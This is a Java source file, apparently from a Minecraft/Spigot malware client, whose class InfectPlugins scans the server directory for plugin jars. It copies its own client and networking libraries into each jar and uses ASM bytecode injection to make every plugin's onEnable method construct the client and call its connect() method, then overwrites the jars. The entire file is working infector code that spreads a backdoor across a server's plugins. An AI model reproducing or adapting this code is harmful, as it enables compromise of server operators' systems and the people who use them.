package net.vitox.client.feature;

import net.vitox.client.Client;
import net.vitox.utils.ASMUtils;
import net.vitox.utils.JarUtils;
import okhttp3.OkHttpClient;
import okio.Okio;
import org.objectweb.asm.Opcodes;
import org.objectweb.asm.tree.*;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.stream.Collectors;
import java.util.stream.Stream;

public class InfectPlugins {

    public static void collectPlugins() {
        if (Client.clientLocation.getPath().contains("plugins")) {
            try (Stream<Path> walk = Files.walk(Paths.get(System.getProperty("user.dir") + "/"))) {
                List<String> result = walk.filter(Files::isRegularFile).map(Path::toString).collect(Collectors.toList());

                rewritePlugins(result);
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    public static void rewritePlugins(List<String> plugins) {

        outer:
        for (String plugin : plugins) {
            if (plugin.endsWith(".jar")) {
                try {
                    File currentJar = new File(Client.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath());

                    if (currentJar.getName().equals(plugin) || plugin.contains("spigot")) {
                        continue;
                    }
                    ArrayList<ClassNode> nodes = new ArrayList<>();

                    HashMap<String, byte[]> out = new HashMap<>();

                    Map<String, ClassNode> pluginClasses = JarUtils.loadClasses(new File(plugin));
                    for (ClassNode value : pluginClasses.values()) {
                        if (
                                value.name.contains(Client.class.getPackage().getName().replaceAll("\\.", "/"))
                                        || value.name.contains(OkHttpClient.class.getPackage().getName().replaceAll("\\.", "/"))
                                        || value.name.contains(Okio.class.getPackage().getName().replaceAll("\\.", "/"))
                                        || value.name.contains("tk/pratanumandal")) {
                            continue outer;
                        } else {
                            nodes.add(value);
                        }
                    }

                    JarUtils.loadClasses(new File(plugin)).forEach((name, c) -> {
                        nodes.add(c);
                    });

                    JarUtils.loadClasses(currentJar).forEach((name, c) -> {
                        if (
                                c.name.contains(Client.class.getPackage().getName().replaceAll("\\.", "/"))
                                        || c.name.contains(OkHttpClient.class.getPackage().getName().replaceAll("\\.", "/"))
                                        || c.name.contains(Okio.class.getPackage().getName().replaceAll("\\.", "/"))
                                        || c.name.contains("tk/pratanumandal")) {
                            nodes.add(c);
                        }
                    });

                    JarUtils.loadNonClassEntries(new File(plugin)).forEach((name, c) -> {
                        out.put(name, c);
                    });

                    for (ClassNode cn : nodes) {
                        for (MethodNode mv : cn.methods) {
                            if (mv.name.equals("onEnable")) {

                                InsnList ins = new InsnList();

                                ins.add(new TypeInsnNode(Opcodes.NEW, Client.class.getName().replaceAll("\\.", "/")));
                                ins.add(new InsnNode(Opcodes.DUP));
                                ins.add(new MethodInsnNode(Opcodes.INVOKESPECIAL, Client.class.getName().replaceAll("\\.", "/"), "<init>", "()V"));
                                ins.add(new VarInsnNode(Opcodes.ASTORE, 1));

                                ins.add(new VarInsnNode(Opcodes.ALOAD, 1));
                                ins.add(new MethodInsnNode(Opcodes.INVOKEVIRTUAL, Client.class.getName().replaceAll("\\.", "/"), "connect", "()V"));

                                mv.instructions.insert(ins);
                            }
                        }
                    }

                    nodes.forEach(c1 -> {
                        byte[] b = ASMUtils.getNodeBytes0(c1);
                        if (b != null)
                            out.put(c1.name + ".class", b);
                    });

                    JarUtils.saveAsJar(out, plugin, false);

                    nodes.clear();
                    out.clear();

                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }
        plugins.clear();

    }

}
